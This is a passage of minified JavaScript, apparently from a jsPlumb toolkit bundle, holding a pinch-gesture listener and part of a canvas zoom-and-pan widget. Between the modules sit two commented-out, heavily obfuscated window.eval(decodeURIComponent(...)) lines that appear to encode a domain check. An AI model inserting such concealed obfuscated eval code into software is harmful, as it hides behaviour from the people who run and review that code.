        var e = g(b, c, d);
        a.addEventListener ? a.addEventListener(h, e, !1) : a.attachEvent && a.attachEvent("onmousewheel", e)
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this;
    a.PinchListener = function(a) {
        var b = "onpointerdown"in document.documentElement
          , c = "ontouchstart"in document.documentElement
          , d = [0, 0]
          , e = 0
          , f = 0
          , g = function(b) {
            a[b](d, f, e, e / f)
        }
          , h = function() {
            a.onPinchEnd()
        }
          , i = "onPinchStart"
          , j = "onPinch"
          , k = "pointerdown"
          , l = "pointermove"
          , m = "pointerup"
          , n = "touchstart"
          , o = "touchmove"
          , p = "touchend"
          , q = function(a, b, c, d) {
            return Math.sqrt(Math.pow(c - a, 2) + Math.pow(d - b, 2))
        }
          , r = {
            pointer: function() {
                var b = {}
                  , c = []
                  , n = 0
                  , o = !1
                  , p = function() {
                    2 == n && (d = [(c[1].p[0] + c[0].p[0]) / 2, (c[1].p[1] + c[0].p[1]) / 2],
                    e = q(c[1].p[0], c[1].p[1], c[0].p[0], c[0].p[1]))
                }
                  , r = function(a) {
                    n >= 2 || o || (c[n] = {
                        e: a,
                        p: [a.pageX, a.pageY]
                    },
                    b["" + a.pointerId] = n,
                    n++,
                    p(),
                    2 == n && (f = e,
                    g(i)))
                }
                  , s = function(a) {
                    var c = b["" + a.pointerId];
                    null != c && (delete b["" + a.pointerId],
                    n--,
                    o = 0 !== n,
                    h())
                }
                  , t = function(a) {
                    if (!o && 2 == n) {
                        var d = b[a.pointerId];
                        null != d && (c[d].p = [a.pageX, a.pageY],
                        p(),
                        g(j))
                    }
                };
                a.bind(a.el, k, r),
                a.bind(document, m, s),
                a.bind(document, l, t)
            },
            touch: function(a) {
                var b = function(a) {
                    return a.touches || []
                }
                  , c = function(a, b) {
                    return a.item ? a.item(b) : a[b]
                }
                  , k = function(a) {
                    var b = c(a, 0)
                      , d = c(a, 1);
                    return q(b.pageX, b.pageY, d.pageX, d.pageY)
                }
                  , l = function(a) {
                    var b = c(a, 0)
                      , d = c(a, 1);
                    return [(b.pageX + d.pageX) / 2, (b.pageY + d.pageY) / 2]
                }
                  , m = !1
                  , r = function(c) {
                    var h = b(c);
                    2 == h.length && a.enableWheelZoom !== !1 && (d = l(h),
                    e = f = k(h),
                    m = !0,
                    a.bind(document, o, t),
                    a.bind(document, p, s),
                    g(i))
                }
                  , s = function(b) {
                    m = !1,
                    a.unbind(document, o, t),
                    a.unbind(document, p, s),
                    h()
                }
                  , t = function(a) {
                    if (m) {
                        var c = b(a);
                        2 == c.length && (e = k(c),
                        d = l(c),
                        g(j))
                    }
                };
                a.bind(a.el, n, r)
            }
        };
        b ? r.pointer(a) : c && r.touch(a)
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    var a = this
      , b = a.jsPlumb;
    this.ZoomWidget = function(a) {
        function d(b, c) {
            if (g())
                return {
                    w: 0,
                    h: 0,
                    x: 0,
                    y: 0,
                    vw: a.width(u),
                    vh: a.height(u),
                    padding: b,
                    z: 1,
                    zoom: 1
                };
            b = b || 0,
            c = c || .9;
            var d = Math.abs(ma.maxx[0][0][0] + ma.maxx[0][1] - ma.minx[0][0][0])
              , e = Math.abs(ma.maxy[0][0][1] + ma.maxy[0][2] - ma.miny[0][0][1])
              , f = a.width(u)
              , h = a.height(u)
              , i = f / ((d + 2 * b) / c)
              , j = h / ((e + 2 * b) / c)
              , k = Math.min(i, j);
            return {
                w: d,
                h: e,
                x: ma.minx[0][0][0],
                y: ma.miny[0][0][1],
                vw: f,
                vh: h,
                padding: b,
                z: k,
                zoom: ca
            }
        }
        function g() {
            for (var a in na)
                return !1;
            return !0
        }
        function h(a) {
            for (var b in ma)
                if (ma.hasOwnProperty(b)) {
                    for (var c = -1, d = 0; d < ma[b].length; d++)
                        if (ma[b][d][3] === a) {
                            c = d;
                            break
                        }
                    c != -1 && ma[b].splice(c, 1)
                }
        }
        a.events = a.events || {};
        var i, j, k, l, m, n, o = this, p = function() {}, q = a.canvas, r = a.domElement || function(a) {
            return a
        }
        , s = r(q), t = a.viewport, u = r(t), v = a.events.zoom || p, w = (a.events.maybeZoom || function() {
            return !0
        }
        ,
        a.events.pan || p), x = a.events.mousedown || p, y = a.events.mouseup || p, z = a.events.mousemove || p, A = a.events.transformOrigin || p, B = !(a.clamp === !1), C = a.clampZoom !== !1, D = a.panDistance || 50, E = a.enablePan !== !1, F = a.enableWheelZoom !== !1, G = a.enableAnimation !== !1, H = a.wheelFilter || function() {
            return !0
        }
        , I = a.wheelZoomMetaKey === !0, J = a.wheelReverse === !0 ? -1 : 1, K = J * (a.wheelSensitivity || 10), L = a.enablePanButtons !== !1, M = a.padding || [0, 0], N = a.consumeRightClick !== !1, O = a.smartMinimumZoom, P = !1, Q = "mousedown", R = "mouseup", S = "mousemove", T = ["webkit", "Moz", "ms"], U = a.bind, V = a.unbind, W = !(a.enabled === !1), X = a.clampToBackground, Y = a.clampToBackgroundExtents, Z = a.filter || function(a) {
            return !1
        }
        , $ = a.width, _ = a.height, aa = 0, ba = 0, ca = a.zoom || 1, da = [0, 0], ea = !1, fa = !1, ga = !1, ha = !1, ia = a.zoomRange || [.05, 3], ja = 150, ka = -1, la = -1, ma = {
            minx: [],
            maxx: [],
            miny: [],
            maxy: []
        }, na = {}, oa = {}, pa = {}, qa = !1, ra = function() {
            ma.minx.sort(function(a, b) {
                return a[0][0] < b[0][0] ? -1 : 1
            }),
            ma.miny.sort(function(a, b) {
                return a[0][1] < b[0][1] ? -1 : 1
            }),
            ma.maxx.sort(function(a, b) {
                return a[0][0] + a[1] > b[0][0] + b[1] ? -1 : 1
            }),
            ma.maxy.sort(function(a, b) {
                return a[0][1] + a[2] > b[0][1] + b[2] ? -1 : 1
            })
        }, sa = function(a, b, c, d) {
            null == na[a] && (na[a] = [],
            ma.minx.push(na[a]),
            ma.miny.push(na[a]),
            ma.maxx.push(na[a]),
            ma.maxy.push(na[a])),
            na[a][0] = b,
            na[a][1] = c,
            na[a][2] = d,
            na[a][3] = a,
            P ? qa = !0 : ra()
        };
        this.setBoundsFor = sa,
        this.setSuspendRendering = function(a) {
            P = a,
            !a && qa && ra(),
            qa = !1
        }
        ;
        var ta = function(a, b) {
            return function(c) {
                Ua(s, a * D, b * D, null, !0, function(a) {
                    w(a[0], a[1], ca, ca, c),
                    i && i.pan(),
                    db.pan()
                })
            }
        }
          , ua = 150
          , va = 60
          , wa = 10
          , xa = null
          , ya = null
          , za = null
          , Aa = function(b, c, d) {
            return function() {
                za = d,
                a.addClass(za, "jtk-surface-pan-active"),
                a.bind(document, "mouseup", Ba),
                xa = window.setTimeout(function() {
                    a.bind(document, R, Da),
                    ya = window.setInterval(Ca(b, c), va)
                }, ua)
            }
        }
          , Ba = function() {
            window.clearTimeout(xa),
            za && a.removeClass(za, "jtk-surface-pan-active"),
            za = null
        }
          , Ca = function(a, b) {
            return function(c) {
                var d = Ua(s, a * wa, b * wa, null);
                w(d[0], d[1], ca, ca, c),
                i && i.pan(),
                db.pan()
            }
        }
          , Da = function() {
            window.clearTimeout(ya)
        }
          , Ea = function(b, c, d, e, f) {
            var g = document.createElement("div");
            g.innerHTML = f || "",
            g.style.position = "absolute";
            for (var h in c)
                g.style[h] = c[h];
            return g.className = "jtk-surface-pan jtk-surface-pan-" + b,
            u.appendChild(g),
            a.bind(g, "click", ta(d, e)),
            a.bind(g, "mousedown", Aa(d, e, g)),
            g
        };
        L && (Ea("top", {
            left: "0px",
            top: "0px"
        }, 0, -1, "&#8593;"),
        Ea("bottom", {
            left: "0px",
            bottom: "0px"
        }, 0, 1, "&#8595;"),
        Ea("left", {
            left: "0px",
            top: "0px"
        }, -1, 0, "&#8592;"),
        Ea("right", {
            right: "0px",
            top: "0px"
        }, 1, 0, "&#8594;"));
        var Fa = function(a, b, c) {
            c = c || s;
            for (var d = 0; d < T.length; d++) {
                var e = a.replace(/([a-z]){1}/, function(a) {
                    return T[d] + a.toUpperCase()
                });
                c.style[e] = b
            }
            c.style[a] = b
        }
          , Ga = function(a) {
            Fa("transformOrigin", da[0] + "% " + da[1] + "%", a)
        }
          , Ha = function(b, c) {
            var d = Va()
              , e = a.offset(u, !0)
              , f = Ta(s)
              , g = a.width(q)
              , h = a.height(q)
              , i = [(b - (e.left + f[0]) - d[0]) / ca, (c - (e.top + f[1]) - d[1]) / ca];
            return {
                w: g,
                h: h,
                xy: i,
                xScale: i[0] / g,
                yScale: i[1] / h,
                o: [i[0] / g * 100, i[1] / h * 100]
            }
        }
          , Ia = function(a, b, c, d) {
            var e, f, g, h, i = da[0] / 100 * b, j = da[1] / 100 * c;
            e = -(i * (1 - ca)),
            f = -(j * (1 - ca)),
            da = a,
            Ga(),
            i = da[0] / 100 * b,
            j = da[1] / 100 * c,
            g = -(i * (1 - ca)),
            h = -(j * (1 - ca));
            var k = Ua(s, g - e, h - f, d);
            A && A(da, k)
        }
          , Ja = function(a, b, c) {
            var d = Ha(a, b);
            Ia(d.o, d.w, d.h, c)
        }
          , Ka = function(a) {
            var b = Ma(a);
            Ja(b[0], b[1], a)
        }
          , La = function(b, c) {
            var d = a.width(q)
              , e = a.height(q);
            Ia([b / d * 100, c / e * 100], d, e)
        }
          , Ma = this.pageLocation = function(a) {
            if (null != a.pageX)
                return [a.pageX, a.pageY];
            var b = Na(Oa(a), 0);
            return b ? [b.pageX, b.pageY] : [0, 0]
        }
          , Na = function(a, b) {
            return a.item ? a.item(b) : a[b]
        }
          , Oa = function(a) {
            return a.touches || []
        }
          , Pa = function(a, b, c, e, f) {
            if (!(null == a || isNaN(a) || a < 0)) {
                var g = ia[0];
                if (O) {
                    g = .5;
                    var h = d().z
                      , j = a / h;
                    j < g && (a = h * g)
                } else
                    a < g && (a = g);
                if (a > ia[1] && (a = ia[1]),
                e) {
                    var k = a > ca ? .05 : -.05
                      , l = ca
                      , m = a < ca
                      , n = window.setInterval(function() {
                        l = Pa(l + k),
                        m && l <= a && window.clearInterval(n),
                        !m && l >= a && window.clearInterval(n)
                    });
                    return ca
                }
                Fa("transform", "scale(" + a + ")");
                var o = ca;
                if (ca = a,
                f || v(aa, ba, ca, o, b, c),
                null != i && i.setZoom(a),
                db && db.pan(),
                C) {
                    var p = Ta(s)
                      , q = Sa(p[0], p[1]);
                    q[0] == p[0] && q[1] == p[1] || Ta(s, q[0], q[1], null, !e)
                }
                return ca
            }
        }
          , Qa = function(a, b, c, d) {
            b < -ja && (b = -ja),
            b > ja && (b = ja),
            Ra(k, b, -ja, ja, c, d)
        }
          , Ra = function(a, b, c, d, e, f) {
            var g = b / (b >= 0 ? d : c)
              , h = b >= 0 ? 1 : 0
              , i = a + g * (ia[h] - a);
            Pa(i, e, f)
        }
          , Sa = function(b, c, e) {
            if (B || X || Y) {
                var f = Va()
                  , g = b
                  , h = c
                  , j = B ? d() : {
                    x: 0,
                    y: 0,
                    w: 0,
                    h: 0,
                    vw: a.width(u),
                    vh: a.height(u),
                    padding: e,
                    z: 1
                };
                if (e = (e || 20) * ca,
                (X || Y) && null != i) {
                    var k = i.getWidth()
                      , l = i.getHeight()
                      , m = Math.max(j.x + j.w, k)
                      , n = Math.max(j.y + j.h, l);
                    j.w = m - j.w,
                    j.h = n - j.h;
                    var o = j.vw / j.w
                      , p = j.vh / j.h;
                    j.z = Math.min(o, p),
                    Y && (e = Math.max(j.vw, j.vh))
                }
                var q = [j.x + j.w, j.y + j.h];
                i && (q[0] = Math.max(q[0], i.getWidth()),
                q[1] = Math.max(q[1], i.getHeight()));
                var r = b + f[0] + q[0] * ca - e
                  , s = c + f[1] + q[1] * ca - e
                  , t = b + f[0] + j.x * ca + e
                  , v = c + f[1] + j.y * ca + e;
                return r < 0 && (g -= r),
                t > j.vw && (g -= t - j.vw),
                s < 0 && (h -= s),
                v > j.vh && (h -= v - j.vh),
                [g, h]
            }
            return [b, c]
        }
          , Ta = function(b, c, d, e, f, g, h) {
            if (1 == arguments.length)
                return [parseInt(b.style.left, 10) || 0, parseInt(b.style.top, 10) || 0];
            var i = Sa(c, d);
            return G && !f && a.animate ? a.animate(b, {
                left: i[0],
                top: i[1]
            }, {
                step: h,
                complete: function() {
                    g && g(i)
                }
            }) : (b.style.left = i[0] + "px",
            b.style.top = i[1] + "px",
            g && g(i)),
            i
        };
        s.style.left = "0px",
        s.style.top = "0px";
        var Ua = function(a, b, c, d, e, f) {
            var g = Ta(a);
            return Ta(a, g[0] + b, g[1] + c, d, !e, f)
        }
          , Va = function() {
            var b = a.width(q)
              , c = a.height(q)
              , d = da[0] / 100 * b
              , e = da[1] / 100 * c;
            return [d * (1 - ca), e * (1 - ca)]
        }
          , Wa = {
            start: function(b, c) {
                if (!fa) {
                    var d = b.srcElement || b.target;
                    W && (d == s || d == u || d._jtkDecoration || i && i.owns(d) || Z(d, b) === !0) && (ha = !1,
                    ka = -1,
                    la = -1,
                    3 !== b.which || a.enableWheelZoom === !1 || null != b.mozInputSource && 1 !== b.mozInputSource ? c.length <= 1 && (ea = !0,
                    j = Ma(b),
                    n = Ta(s)) : (ga = !0,
                    j = Ma(b),
                    Ka(b),
                    n = Ta(s),
                    k = ca)),
                    x(b, o)
                }
            },
            move: function(a, b) {
                var c, d, e;
                if (ha = !1,
                !fa) {
                    if (ga)
                        e = Ma(a),
                        c = e[0] - j[0],
                        d = e[1] - j[1],
                        Qa(c, d, a);
                    else if (ea && E && null != j) {
                        e = Ma(a),
                        c = e[0] - j[0],
                        d = e[1] - j[1];
                        var f = Ta(s, n[0] + c, n[1] + d, a, !0);
                        w(f[0], f[1], ca, ca, a),
                        i && i.pan(),
                        db && db.pan()
                    }
                    z(a, o)
                }
            },
            end: function(a, b) {
                fa || (ga = !1,
                j = null,
                ea = !1,
                ha = !1,
                V(document, S, Ya),
                V(document, R, Za),
                U(document, S, $a),
                y(a, o))
            },
            contextmenu: function(a) {}
        }
          , Xa = function(a, b) {
            "contextmenu" == a && N && b.preventDefault && b.preventDefault();
            var c = Oa(b);
            Wa[a](b, c)
        }
          , Ya = function(a) {
            Xa("move", a)
        }
          , Za = function(a) {
            Xa("end", a)
        }
          , $a = function(a) {
            ha = !1
        };
        U(document, S, $a);
        var _a = this.start = function(a) {
            W && null != a && (V(document, S, $a),
            U(document, S, Ya),
            U(document, R, Za),
            Wa.start(a, Oa(a)))
        }
        ;
        if (U(t, Q, _a),
        U(t, "contextmenu", function(a) {
            Xa("contextmenu", a)
        }),
        F) {
            var ab = function(a) {
                H(a) && (a.preventDefault && a.preventDefault(),
                a.stopPropagation && a.stopPropagation(),
                k = ca,
                ha || (Ka(a),
                ha = !0),
                Qa(0, a.normalizedWheelDelta * K, a, !0))
            };
            addWheelListener(u, ab, !0, I)
        }
        new PinchListener({
            el: t,
            bind: U,
            unbind: V,
            enableWheelZoom: a.enableWheelZoom,
            onPinch: function(a, b, c, d) {
                Pa(d * k);
                var e = a[0] - j[0]
                  , f = a[1] - j[1];
                Ta(s, n[0] + e, n[1] + f, null, !0)
            },
            onPinchStart: function(a, b) {
                fa = !0,
                j = a,
                l = m = b,
                k = ca,
                Ja(j[0], j[1]),
                n = Ta(s)
            },
            onPinchEnd: function() {
                fa = !1,
                j = null
            }
        }),
        Pa(ca, null, !1, !1, !0),
        Ga(),
        this.positionChanged = function(b, c, d) {
            d = d || a.id(b);
            var e = c || Ta(b)
              , f = a.width(b)
              , g = a.height(b);
            oa[d] = b,
            sa(d, e, f, g)
        }
        ,
        this.add = function(a, b, c, d) {
            this.positionChanged(a, c, b),
            d && (U(a, Q, _a),
            a._jtkDecoration = !0)
        }
        ,
        this.suspend = function(b) {
            var c = "string" == typeof b ? b : a.id(b);
            pa[c] = !0,
            h(c)
        }
        ,
        this.isSuspended = function(b) {
            var c = "string" == typeof b ? b : a.id(b);
            return pa[c] === !0
        }
        ,
        this.restore = function(b) {
            var c = "string" == typeof b ? b : a.id(b);
            delete pa[c],
            this.positionChanged(b, null, c)
        }
        ,
        this.remove = function(b) {
            b = r(b);
            var c = a.id(b);
            delete na[c],
            delete oa[c],
            delete pa[c],
            h(c)
        }
        ,
        this.reset = function() {
            ma.minx.length = 0,
            ma.miny.length = 0,
            ma.maxx.length = 0,
            ma.maxy.length = 0,
            na = {},
            oa = {},
            pa = {},
            Ta(s, 0, 0, null, !0)
        }
        ,
        this.getBoundsInfo = d,
        this.zoomToFit = function(a) {
            a = a || {};
            var b = d(a.padding, a.fill);
            a.doNotZoomIfVisible && b.z > ca || Pa(b.z),
            o.centerContent({
                bounds: b,
                doNotAnimate: a.doNotAnimate !== !1,
                onComplete: a.onComplete,
                onStep: a.onStep,
                doNotFirePanEvent: a.doNotFirePanEvent
            })
        }
        ,
        this.zoomToFitIfNecessary = function(a) {
            var c = b.extend(a || {});
            c.doNotZoomIfVisible = !0,
            this.zoomToFit(c)
        }
        ,
        this.zoomToElements = function(b) {
            for (var c = {
                x: 1 / 0,
                y: 1 / 0,
                xMax: -(1 / 0),
                yMax: -(1 / 0),
                z: 1,
                vw: a.width(u),
                vh: a.height(u)
            }, d = 0; d < b.elements.length; d++) {
                var e = b.elements[d]
                  , f = a.offset(e)
                  , g = a.width(e)
                  , h = a.height(e);
                c.x = Math.min(c.x, f.left),
                c.y = Math.min(c.y, f.top),
                c.xMax = Math.max(c.xMax, f.left + g),
                c.yMax = Math.max(c.yMax, f.top + h)
            }
            var i = a.fill || .9;
            c.w = i * (c.xMax - c.x),
            c.h = i * (c.yMax - c.y),
            c.z = Math.min(c.vw / c.w, c.vh / c.h),
